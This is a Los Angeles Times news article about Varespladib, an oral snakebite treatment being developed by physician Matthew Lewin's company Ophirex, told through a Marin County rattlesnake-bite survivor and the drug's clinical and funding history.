<div id="readability-page-1" class="page"><div data-element="story-body" data-dateline="" data-subscriber-content="">  <p><span>SAN FRANCISCO&nbsp;‚Äî&nbsp;</span></p><p>John Heenan knows the terror of feeling a sting on his foot, then looking down and seeing two bright red puncture wounds about an inch apart and a massive rattlesnake slithering away into tall grass.</p><p>It was a summer morning in 2017, and the 74-year-old horticulturist was carrying a box of fruit in a Marin County orchard when, he said, ‚ÄúI stepped right on him, then called out to a partner, ‚ÄòHey, I‚Äôve been bitten by a rattlesnake.‚Äô‚Äù</p><p>It‚Äôs a snapshot imprinted in Heenan‚Äôs brain. ‚ÄúThe fangs struck a vein, and I could feel the venom moving throughout my system,‚Äù he recalled, wincing at the memory. ‚ÄúI started seizing up, and struggled to breathe as though I had the wind knocked out of me.‚Äù</p><div data-click="enhancement" data-module-id="0000018a-d215-de7e-a3ce-d715a9510002" data-align-center="">  <div>   <a href="https://www.latimes.com/environment"><picture>     <img alt="Climate California" width="510" height="161" src="https://ca-times.brightspotcdn.com/90/bb/022ad6e14f6487f2d58336619061/climatecasvg-padding.svg" decoding="async" loading="lazy">  </picture></a>   </div>     <p>Aggressive and impactful reporting on climate change, the environment, health and science.</p>      </div><p>Heenan was rushed to a hospital, where he spent the next four days in a coma. During that time, he was administered 28 vials of antivenom intravenously at a cost of $3,400 per vial. </p><p>When he regained consciousness, there were two people at his bedside, his wife and expedition doctor Matthew Lewin, who smiled and said, ‚ÄúYou are one lucky guy.‚Äù</p><div data-click="enhancement" data-align-center=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/e8c461e/2147483647/strip/true/crop/3024x4032+0+0/resize/320x427!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/29a3da5/2147483647/strip/true/crop/3024x4032+0+0/resize/568x757!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/9c1dae4/2147483647/strip/true/crop/3024x4032+0+0/resize/768x1024!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/e6d3011/2147483647/strip/true/crop/3024x4032+0+0/resize/1080x1440!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/af29672/2147483647/strip/true/crop/3024x4032+0+0/resize/1240x1654!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/15f99cd/2147483647/strip/true/crop/3024x4032+0+0/resize/1440x1920!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/48856ec/2147483647/strip/true/crop/3024x4032+0+0/resize/2160x2880!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 2160w" sizes="100vw">     <img alt="A man gestures to another man while the pair stand in an orchard." srcset="https://ca-times.brightspotcdn.com/dims4/default/4492a05/2147483647/strip/true/crop/3024x4032+0+0/resize/320x427!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/0b9f240/2147483647/strip/true/crop/3024x4032+0+0/resize/568x757!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/ce6720c/2147483647/strip/true/crop/3024x4032+0+0/resize/768x1024!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/09f6140/2147483647/strip/true/crop/3024x4032+0+0/resize/1080x1440!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/e8217fd/2147483647/strip/true/crop/3024x4032+0+0/resize/1240x1654!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/262ceea/2147483647/strip/true/crop/3024x4032+0+0/resize/1440x1920!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/8705d55/2147483647/strip/true/crop/3024x4032+0+0/resize/2160x2880!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG 2160w" sizes="100vw" width="2000" height="2667" src="https://ca-times.brightspotcdn.com/dims4/default/cd36856/2147483647/strip/true/crop/3024x4032+0+0/resize/2000x2667!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2Fb7%2F47%2F00e8d1fb442fb6218f89a35b8c4a%2Fla-me-snake-bite-medicine08.JPG" decoding="async" loading="lazy">  </picture>  <div>   <p>Matthew Lewin, left, and John  Heenan  stand in the  orchard  where Heenan  was bitten by a 5 1/2-foot-long Pacific rattlesnake. The horticulturist at Indian Valley Campus of the College of Marin went into a coma for four days.</p>   <p>(Louis Sahagun / Los Angeles Times)</p>   </div>  </figure></div><p>Heenan would later learn that Lewin was hot on the trail of a novel treatment for the long, agonizing and often deadly effects of venomous snakebites: It‚Äôs a pill that he says ‚Äúis intended to at least buy victims enough time to get to the hospital.‚Äù</p><p>Snake venom is a complex cocktail of toxins, amino acids and proteins that evolved primarily to immobilize and kill prey, but it also  prepares tissues for digestion. In humans, venom causes severe swelling and instability of blood pressure, neuromuscular weakness and paralysis, hemorrhaging, and the death of skeletal muscle, leading to permanent tissue loss and amputations.</p><p>The World Health Organization estimates that 138,000 people are killed by venomous snakes annually, and most of them die before they can reach emergency medical care. This suffering goes on with little outrage or publicity because snakebites most often occur in impoverished, backwater areas, and there is no easy way to treat snakebite in the field.</p><p> Nature has provided an abundance of slithering assailants to watch out for: rattlesnakes, copperheads, water moccasins and coral snakes in the United States; kraits in Southeast Asia; taipans in Australia; Nikolsky‚Äôs vipers in Ukraine; Gaboon vipers with 2-inch-long fangs in Africa; and bushmasters in Central America. Then there are Russel‚Äôs vipers, big, irritable snakes responsible for 25,000 fatalities in India annually.</p><p>Typical standard-of-care antivenoms are extremely expensive, require refrigeration and must be administered intravenously in a hospital setting. They are also species-specific, meaning selecting proper antivenom requires knowing which type of snake bit you. </p><p>As a result, survivors of rattlesnake bites in Southern California, for instance, get a second painful surprise when presented with hospital bills totaling hundreds of thousands of dollars.</p><div data-click="enhancement" data-align-right=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/3a4ebe2/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/d705c01/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/231b72f/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/89b71b6/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/a547d6c/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/0ae28c2/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/6e71803/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 2160w" sizes="100vw">     <img alt="A specimen from the Herpetology Collection at the California Academy of Sciences in San Francisco." srcset="https://ca-times.brightspotcdn.com/dims4/default/ab2c21d/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/7e64135/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/35f4efb/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/5f1bebd/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/7b1c14e/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/54145e4/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/314f69d/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG 2160w" sizes="100vw" width="2000" height="1334" src="https://ca-times.brightspotcdn.com/dims4/default/0a07670/2147483647/strip/true/crop/4000x2667+0+0/resize/2000x1334!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F34%2F67%2F858a1b5646548dc5f463ea4f1f88%2Fla-me-snake-bite-medicine05.JPG" decoding="async" loading="lazy">  </picture>  <div>      <p>(Gayle Laird / California Academy of Sciences)</p>   </div>  </figure></div><p>Lewin has been working for a decade to develop an easy-to-use, needle-free solution to all those problems with a drug called Varespladib.</p><p>What makes Varespladib promising is that it blocks phospholipase-A2, a highly toxic protein that is present in 95% of all snake venoms and plays a direct role in life-threatening tissue destruction, catastrophic bleeding, paralysis and respiratory failure. Proponents say the small synthetic molecule has the potential to stop or reverse neurological damage, as well as restore normal blood-clotting ability when administered immediately after envenoming.</p><p>Drug trials are  being conducted by  Ophirex Inc. ‚Äî a public benefit corporation that Lewin founded with musician and entrepreneur Jerry Harrison in Corte Madera, Calif.</p><p>The U.S. Food and Drug Administration a year ago granted Varespladib a ‚Äúfast track‚Äù designation to expedite development and review of its safety and effectiveness, as well as Ophirex‚Äôs proposals for manufacturing and distributing the drug. </p><p>The Department of Defense has also invested about $24 million into the effort, saying the drug could provide an important capability to teams of special forces deployed in austere conditions where snakebites are a significant threat to life and limb.</p><p> ‚ÄúOphirex may help us widen the window of time needed for evacuation in the event of a snakebite,‚Äù said Lindsey Garver, deputy manager for the Army Medical Materiel Agency‚Äôs Warfighter Protection and Acute Care Project. ‚ÄúThere is also a psychological benefit to having something in your pocket that is life-saving.‚Äù</p><div data-click="enhancement" data-align-right=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/a65d63c/2147483647/strip/true/crop/2667x4000+0+0/resize/320x480!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/31511b0/2147483647/strip/true/crop/2667x4000+0+0/resize/568x852!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/016d0cd/2147483647/strip/true/crop/2667x4000+0+0/resize/768x1152!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/8a18abf/2147483647/strip/true/crop/2667x4000+0+0/resize/1080x1620!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/d6ac5e9/2147483647/strip/true/crop/2667x4000+0+0/resize/1240x1860!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/a076bd7/2147483647/strip/true/crop/2667x4000+0+0/resize/1440x2160!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/75fb52b/2147483647/strip/true/crop/2667x4000+0+0/resize/2160x3240!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 2160w" sizes="100vw">     <img alt="Bottles of antivenom." srcset="https://ca-times.brightspotcdn.com/dims4/default/26488fa/2147483647/strip/true/crop/2667x4000+0+0/resize/320x480!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/1f028b7/2147483647/strip/true/crop/2667x4000+0+0/resize/568x852!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/f51fbe8/2147483647/strip/true/crop/2667x4000+0+0/resize/768x1152!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/fd6fa30/2147483647/strip/true/crop/2667x4000+0+0/resize/1080x1620!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/b41b0c7/2147483647/strip/true/crop/2667x4000+0+0/resize/1240x1860!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/61ba39b/2147483647/strip/true/crop/2667x4000+0+0/resize/1440x2160!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/80f5a8b/2147483647/strip/true/crop/2667x4000+0+0/resize/2160x3240!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG 2160w" sizes="100vw" width="2000" height="3000" src="https://ca-times.brightspotcdn.com/dims4/default/3d12775/2147483647/strip/true/crop/2667x4000+0+0/resize/2000x3000!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F2e%2Fc5%2Fd5e7c8724a548707e7fba0e143d8%2Fla-me-snake-bite-medicine01.JPG" decoding="async" loading="lazy">  </picture>  <div>   <p>Bottles of anti-venom at the California Academy of Sciences in San Francisco.</p>   <p>(Gayle Laird / California Academy of Sciences)</p>   </div>  </figure></div><p>But getting any new drug from the laboratory to the market is an expensive, intricate process that can sometimes take just months to show promise but years to perfect.</p><p>The company is completing a Phase  II clinical trial in the United States and India to determine the tolerability and potential side effects of multi-dose regimens of the drug in about 100 suspected or confirmed snakebite victims. Among them is a man who a month ago was bitten by a sidewinder rattlesnake near the desert resort city of Palm Springs.</p><p>A federal analysis of the results is expected sometime next year and will ultimately determine whether Ophirex has a blockbuster snakebite drug treatment with military and global market opportunities.</p><p>‚ÄúI certainly underestimated the astonishing complexity of an undertaking such as this one,‚Äù said Lewin, 55, expedition physician for the California Academy of Sciences in San Francisco. ‚ÄúIt‚Äôs humbling.‚Äù</p><p>The company has assembled an impressive board of directors: Derrick Rossi, a stem cell scientist and co-founder of Moderna; Curt LaBelle, chair of Global Health Funds; Tim Garnett, former chief medical officer for Eli Lilly and Co.; and Hans Bishop, co-founder of Altos Labs Inc., a biotechnology research company.</p><p>‚ÄúOur company is trying to produce a drug for a neglected global crisis,‚Äù Rossi said. ‚ÄúThe vast majority of people who are being killed or maimed by snake bites are village farmers and children working out in the fields without shoes.‚Äù</p><p>Varespladib was originally discovered and developed by Eli Lilly and Co. to suppress inflammation. The company abandoned that effort, however, after clinical studies failed to produce the desired results.</p><p>Since then, patents on the drug‚Äôs molecule have expired, providing  Ophirex with ‚Äúan opportunity for us to establish an appropriate patent portfolio,‚Äù said Nancy Koch, chief executive  of  Ophirex.</p><p>The proposed pill‚Äôs price tag remains unclear. ‚ÄúWe haven‚Äôt made any estimates of pricing yet,‚Äù Koch said. ‚ÄúBut we want to make the drug accessible around the world, and to make that possible we are studying ways to reduce manufacturing costs.‚Äù</p><div data-click="enhancement" data-align-center=""><figure> <picture>    <source type="image/webp" srcset="https://ca-times.brightspotcdn.com/dims4/default/b3f670e/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/9f7175c/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/c07c29c/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/9e89061/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/c8a8cdf/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/dcfe6a9/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/62bbaff/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/format/webp/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 2160w" sizes="100vw">     <img alt="A view of the Herpetology Collection at the California Academy of Sciences in San Francisco." srcset="https://ca-times.brightspotcdn.com/dims4/default/f945d43/2147483647/strip/true/crop/4000x2667+0+0/resize/320x213!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 320w,https://ca-times.brightspotcdn.com/dims4/default/1cba055/2147483647/strip/true/crop/4000x2667+0+0/resize/568x379!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 568w,https://ca-times.brightspotcdn.com/dims4/default/45310f4/2147483647/strip/true/crop/4000x2667+0+0/resize/768x512!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 768w,https://ca-times.brightspotcdn.com/dims4/default/26fa750/2147483647/strip/true/crop/4000x2667+0+0/resize/1080x720!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1080w,https://ca-times.brightspotcdn.com/dims4/default/80a8813/2147483647/strip/true/crop/4000x2667+0+0/resize/1240x827!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1240w,https://ca-times.brightspotcdn.com/dims4/default/a8b9216/2147483647/strip/true/crop/4000x2667+0+0/resize/1440x960!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 1440w,https://ca-times.brightspotcdn.com/dims4/default/84e03f6/2147483647/strip/true/crop/4000x2667+0+0/resize/2160x1441!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG 2160w" sizes="100vw" width="2000" height="1334" src="https://ca-times.brightspotcdn.com/dims4/default/71e93d1/2147483647/strip/true/crop/4000x2667+0+0/resize/2000x1334!/quality/75/?url=https%3A%2F%2Fcalifornia-times-brightspot.s3.amazonaws.com%2F98%2Fdf%2Fbefd9fbd40acbb63631a19383587%2Fla-me-snake-bite-medicine06.JPG" decoding="async" loading="lazy">  </picture>  <div>      <p>(Gayle Laird / California Academy of Sciences)</p>   </div>  </figure></div><p>To hear Lewin tell it,  Ophirex emerged from a tragic event. In 2001, Joseph Slowinski, a herpetologist at the California Academy of Sciences in San Francisco, died 30 hours after he was bitten by a small venomous snake in the mountainous jungles of northern Myanmar.</p><p>No antivenom was available at the remote site, a five-day hike from the nearest town. Heroic efforts to save him were unsuccessful.</p><p>A decade later, after a trip to the same region, Lewin, director of the academy‚Äôs Center for Exploration and Travel Health, began to ponder the possibility of a needle-free treatment that could be administered in the field immediately after being bitten.</p><p>Lewin initially set his sights on proving that the potentially fatal paralytic effects of certain toxic substances could be reversed with an antiparalytic drug administered via a nasal spray.</p><p>With that goal in mind, Lewin self-volunteered to become a test subject.</p><p>In a 2013 experiment conducted with a team of anesthesiologists in a research laboratory at UC San Francisco, Lewin allowed himself to be paralyzed with derivative of curare, a chemical typically administered intravenously as a paralyzing agent for surgical procedures.</p><p>Moments later, he said, ‚ÄúI couldn‚Äôt talk, felt dizzy and had trouble breathing.‚Äù</p><p>The team then administered the nasal spray, and within 20 minutes Lewin had recovered. The results of the experiment were published online in the medical journal Clinical Case Reports.</p><p>‚ÄúIt was terrifying, and I‚Äôd never do that again,‚Äù Lewin said. ‚ÄúBut the experiment proved that paralysis could be reversed without intravenous medication.‚Äù</p><p>The arc of Lewin‚Äôs career has led him from emergency rooms to wilderness medicine as a doctor on scientific expeditions sponsored by the American Museum of Natural History, the Kellogg Foundation and National Geographic.</p><p>Not all of his research occurs in remote corners of the world, however. Studying the factors that influence snakebite severity means working with scientists such as William Hayes, a professor at Loma Linda University School of Medicine in Loma Linda, Calif., who keeps an assortment of snake venom available for testing in a laboratory refrigerator.</p><p>It also means studying the physical and financial struggles of survivors like John Heenan, whose hospital bills soared to more than $350,000 after he was bitten at the Indian Valley Campus of the College of Marin.</p><p>‚ÄúMedicare eventually covered my medical costs, but I had to pay about 300 bucks for the ambulance service,‚Äù Heenan said, shaking his head. </p><p>The college, for its part, later planted a large digital welcome sign at its entrance that states: ‚ÄúCAUTION: Entering Rattlesnake Country. Be alert when walking.‚Äù</p> <p>Heenan wouldn‚Äôt argue with any of that. But he also has high hopes for Lewin‚Äôs vision.</p><p>‚ÄúEverybody should carry a few of those pills in their first aid kits and lunch boxes,‚Äù he said. ‚ÄúOf course, they should also watch where they step.‚Äù</p> </div></div>]]></description>
        </item>
    </channel>
</rss>